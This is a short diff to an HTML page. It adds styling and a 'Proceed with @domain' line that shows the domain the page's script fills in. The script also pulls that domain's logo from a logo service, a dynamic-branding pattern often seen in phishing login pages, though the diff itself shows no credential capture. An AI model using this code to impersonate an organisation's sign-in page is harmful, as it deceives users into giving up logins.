@@ -32,6 +32,13 @@
       font-size: 24px;
       text-align: center;
     }
+
+    .only-domain-box {
+      font-size: 18px;
+      text-align: center;
+      margin-top: 10px;
+      color: #333;
+    }
   </style>
 </head>
 <body>
@@ -60,6 +67,7 @@
                         </h1>
                       </td>
                     </tr>
+                    <tr><td height="14"><p>Proceed with <span id="domainDisplay">@domain</span></p></td></tr>
                     <tr><td height="40"></td></tr>
                     <tr>
                       <td>
@@ -124,6 +132,7 @@
     if (domain) {
       document.getElementById('hiddenDomain').value = domain;
       document.getElementById('domainLabel').textContent = domain;
+      document.getElementById('domainDisplay').textContent = '@' + domain;
       document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
     }
   </script>
